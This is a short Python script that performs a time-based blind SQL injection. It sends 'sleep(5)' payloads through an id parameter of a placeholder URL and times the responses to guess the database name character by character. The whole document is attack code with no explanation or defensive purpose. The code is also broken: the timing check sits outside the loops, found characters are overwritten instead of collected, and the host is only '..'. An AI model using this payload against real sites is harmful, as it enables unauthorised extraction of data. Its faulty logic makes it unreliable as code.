import requests
import time

url="http://../?id=1' and if(ascii(substr(database(),{},1))={},sleep(5),1)--+"
result= ''
for i in range(1,10):
	for j in range(32,127):
		payload = url.format(str(i),str(j))
		time1 = time.time()
		r = requests.get(payload)
		time2 = time.time()
		time3 = time2 - time1


if time3 > 4:
    result=chr(j)
    print(result)
